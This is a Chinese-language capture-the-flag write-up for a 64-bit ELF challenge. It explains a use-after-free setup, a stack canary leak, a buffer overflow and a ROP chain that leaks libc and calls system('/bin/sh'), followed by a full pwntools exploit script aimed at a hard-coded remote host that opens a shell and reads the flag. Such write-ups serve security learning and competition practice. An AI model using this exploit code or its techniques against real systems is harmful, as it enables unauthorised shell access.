
**【漏洞分析与利用思路】**
1. **基础环境分析**：目标程序是一个 64 位的 ELF 可执行文件，安全机制方面同时开启了 PIE、canary 以及 NX 保护。通过逆向分析可知，程序的核心控制流主要由 `forest_lock_one`、`forest_lock_two` 与 `main` 等函数构成。
2. **悬垂指针与 UAF 漏洞（forest_lock_one）**：在 `forest_lock_one` 的代码逻辑中，程序借助 `malloc(0x64)` 动态分配了一段名为 `magic` 的内存块，但在执行 `free` 释放后，并未将指针进行置空操作。由于系统堆管理机制，当后续通过指定 `size=100`（即 0x64 的十进制表示）再次触发 `malloc` 时，分配的依然是 `magic` 对应的空间。由于该内存块被纳入了 `tcache/fastbin` 的管理范畴，这一缺陷直接为我们构造 UAF（Use-After-Free）攻击提供了条件。
3. **Canary 泄露及栈溢出（forest_lock_two & main）**：执行流到达 `forest_lock_two` 时，程序会要求输入特定的 `key` 进行校验，我们只需传入指定的正确数值 `2026` 即可完成绕过。随后程序流返回 `main` 函数，在遇到 `read(0x30)` 向 `rbp-0x20` 处写入数据的逻辑时，我们可以精确构造 25 字节的数据填充。利用 `printf("%s")` 直到遇 `\x00` 才会截断的特性，顺势覆盖掉 `canary` 最低位的 `0`，从而顺利将真实的 `canary` 泄露出来。获得该值后，再借助后续的 `read(0x100)` 即可安全地实施栈溢出攻击。
4. **ROP 链构建与 GetShell**：触发溢出后，我们先布置 ROP 链调用 `puts(puts@got)`，将 libc 中关键函数的内存真实地址泄露出来，同时控制程序重新执行 `main` 函数。通过收集到的 `puts`、`printf`、`read`、`setvbuf`、`malloc` 以及 `free` 等地址，可精确匹配出服务器使用的动态链接库版本为 `libc6_2.23-0ubuntu11.3_amd64`。以此为依据，推算 `libc_base` 及 `system` 函数的绝对地址便水到渠成。最后一步，我们复用 ROP 链调用 `read`，将 `/bin/sh` 字符串布置到 `.bss` 内存段，然后引导程序执行 `system('/bin/sh')`，成功拿下 shell 从而读取 flag。

**【Exp 利用脚本】**
```python
#!/usr/bin/env python3
from pwn import *
import argparse
import socket

context.clear(arch="amd64", os="linux")
context.log_level = "info"
BIN_PATH = "./attachment-56"
HOST = "39.96.193.120"
PORT = 10001

def start(args):
    if args.local:
        return process(BIN_PATH)
    if args.proxy:
        proxy_host, proxy_port = args.proxy.rsplit(":", 1)
        s = socket.create_connection((proxy_host, int(proxy_port)), timeout=args.timeout)
        request = (
            f"CONNECT {args.host}:{args.port} HTTP/1.1\r\n"
            f"Host: {args.host}:{args.port}\r\n"
            "\r\n"
        ).encode()
        s.sendall(request)
        response = b""
        while b"\r\n\r\n" not in response:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
        if b" 200 " not in response.split(b"\r\n", 1)[0]:
            raise PwnlibException(response.decode(errors="ignore").strip())
        io = remote.fromsocket(s)
        io.settimeout(args.timeout)
        return io
    return remote(args.host, args.port, timeout=args.timeout)

def unlock(io):
    io.recvuntil(b"Traveler", timeout=3)
    io.recvuntil(b":", timeout=3)
    io.sendline(b"100")
    io.recvuntil(b"sheet!", timeout=3)
    io.sendline(b"magic")
    io.recvuntil(b"What do you sacrifice?", timeout=3)

class CanaryLeakError(RuntimeError):
    pass

def leak_canary(io):
    marker = b"A" * 25
    suffix = b" ... A curious gift indeed.\n"
    io.send(marker)
    data = io.recvuntil(suffix, timeout=3)
    pos = data.index(marker) + len(marker)
    leaked = data[pos : -len(suffix)]
    if len(leaked) < 7:
        raise CanaryLeakError("canary leak was truncated by an inner NULL byte")
    canary = b"\x00" + leaked[:7]
    log.success(f"canary = {hex(u64(canary))}")
    return canary

UBUNTU20_LIBC = {
    "puts": 0x0875A0,
    "system": 0x055410,
    "exit": 0x0E6290,
}
UBUNTU16_LIBC = {
    "puts": 0x06F6A0,
    "system": 0x0453A0,
    "exit": 0x03A030,
}
LIBC_PROFILES = {
    "ubuntu20": UBUNTU20_LIBC,
    "ubuntu16": UBUNTU16_LIBC,
}

def rop_call_read(elf, addr, size):
    rop = ROP(elf)
    rop.ret2csu(
        edi=0,
        rsi=addr,
        rdx=size,
        call=elf.got["read"],
    )
    return rop.chain()

def build_dlresolve_payload(elf, canary, system_arg):
    bss = elf.bss() + 0x800
    dlresolve = Ret2dlresolvePayload(
        elf,
        symbol="system",
        args=[system_arg],
        data_addr=bss,
    )
    rop = ROP(elf)
    rop.raw(rop_call_read(elf, dlresolve.data_addr, len(dlresolve.payload)))
    rop.ret2dlresolve(dlresolve)
    payload = flat(
        b"B" * 24,
        canary,
        b"C" * 8,
        rop.chain(),
    )
    assert len(payload) <= 0x100
    return payload, dlresolve.payload

def overflow_payload(canary, chain):
    payload = flat(
        b"B" * 24,
        canary,
        b"C" * 8,
        chain,
    )
    assert len(payload) <= 0x100
    return payload

def leak_puts(io, elf, canary):
    return leak_symbol(io, elf, canary, "puts")

def leak_symbol(io, elf, canary, symbol):
    pop_rdi = 0x401763
    payload = overflow_payload(
        canary,
        flat(pop_rdi, elf.got[symbol], elf.plt["puts"], elf.sym["main"]),
    )
    io.send(payload)
    io.recvuntil(b"The ghost answers with warmth.\n", timeout=3)
    leak = io.recvline(timeout=3).rstrip(b"\n")
    if len(leak) < 6:
        raise EOFError(f"short {symbol} leak")
    addr = u64(leak[:8].ljust(8, b"\x00"))
    log.success(f"{symbol} = {hex(addr)}")
    io.recvuntil(b"What do you sacrifice?", timeout=3)
    return addr

def leak_symbols(args, names):
    elf = ELF(BIN_PATH, checksec=False)
    io = start(args)
    unlock(io)
    canary = leak_canary(io)
    result = {}
    for name in names:
        if name not in elf.got:
            log.warning(f"{name} has no GOT entry")
            continue
        result[name] = leak_symbol(io, elf, canary, name)
        canary = leak_canary(io)
    io.close()
    return result

def build_ret2libc_payload(elf, canary, libc_base, offsets, command):
    bss = elf.bss() + 0x900
    command_data = command.encode() + b"\x00"
    pop_rdi = 0x401763
    system = libc_base + offsets["system"]
    exit_func = libc_base + offsets["exit"]
    chain = flat(
        rop_call_read(elf, bss, len(command_data)),
        pop_rdi,
        bss,
        system,
        exit_func,
    )
    return overflow_payload(canary, chain), command_data

def send_final_read(io, payload):
    io.send(b"D\x00")
    io.recvuntil(b" ... A curious gift indeed.\n", timeout=3)
    io.send(payload)
    io.recvuntil(b"The ghost answers with warmth.\n", timeout=3)

def exploit_dlresolve(args):
    elf = ELF(BIN_PATH, checksec=False)
    io = start(args)
    unlock(io)
    canary = leak_canary(io)
    system_arg = "/bin/sh" if args.shell else args.command
    payload, resolver_data = build_dlresolve_payload(elf, canary, system_arg)
    io.send(payload)
    io.recvuntil(b"The ghost answers with warmth.", timeout=3)
    io.send(resolver_data)
    if args.shell:
        io.interactive()
    else:
        out = io.recvrepeat(args.timeout)
        print(out.decode(errors="ignore"))
    io.close()

def exploit_libc(args):
    elf = ELF(BIN_PATH, checksec=False)
    io = start(args)
    unlock(io)
    canary = leak_canary(io)
    puts_addr = leak_puts(io, elf, canary)
    if args.libc in LIBC_PROFILES:
        offsets = LIBC_PROFILES[args.libc]
        libc_base = puts_addr - offsets["puts"]
    else:
        libc = ELF(args.libc, checksec=False)
        offsets = {
            "puts": libc.sym["puts"],
            "system": libc.sym["system"],
            "exit": libc.sym["exit"],
        }
        libc_base = puts_addr - offsets["puts"]
    log.success(f"libc base = {hex(libc_base)}")
    system_arg = "/bin/sh" if args.via_shell or args.shell else args.command
    payload, command_data = build_ret2libc_payload(
        elf,
        canary,
        libc_base,
        offsets,
        system_arg,
    )
    send_final_read(io, payload)
    io.send(command_data)
    if args.shell:
        io.interactive()
    elif args.via_shell:
        io.sendline(args.command.encode())
        io.sendline(b"exit")
        out = io.recvrepeat(args.timeout)
        print(out.decode(errors="ignore"))
    else:
        out = io.recvrepeat(args.timeout)
        print(out.decode(errors="ignore"))
    io.close()

def exploit_once(args):
    if args.method == "leak":
        names = [name.strip() for name in args.leak.split(",") if name.strip()]
        leaks = leak_symbols(args, names)
        for name, addr in leaks.items():
            print(f"{name}: {hex(addr)}")
        return
    if args.method == "libc":
        return exploit_libc(args)
    return exploit_dlresolve(args)

def run(args):
    last_error = None
    for attempt in range(1, args.retries + 1):
        try:
            log.info(f"attempt {attempt}/{args.retries}")
            return exploit_once(args)
        except CanaryLeakError as exc:
            last_error = exc
            log.warning(str(exc))
        except (EOFError, PwnlibException) as exc:
            last_error = exc
            log.warning(f"attempt failed: {exc}")
    raise SystemExit(f"failed after {args.retries} attempts: {last_error}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--local", action="store_true")
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", default=PORT, type=int)
    parser.add_argument("--proxy", default=None, help="HTTP CONNECT proxy, for example 127.0.0.1:7890")
    parser.add_argument("--timeout", default=5, type=float)
    parser.add_argument("--retries", default=5, type=int)
    parser.add_argument("--method", choices=["dlresolve", "libc", "leak"], default="libc")
    parser.add_argument("--libc", default="ubuntu16")
    parser.add_argument("--leak", default="puts,printf,read,setvbuf,malloc,free")
    parser.add_argument(
        "-c",
        "--command",
        default="cat flag 2>/dev/null; cat flag.txt 2>/dev/null; cat /flag 2>/dev/null",
    )
    parser.add_argument("--shell", action="store_true")
    parser.add_argument("--via-shell", action="store_true", default=True)
    parser.add_argument("--direct-system", action="store_true")
    parsed = parser.parse_args()
    if parsed.direct_system:
        parsed.via_shell = False
    run(parsed)
```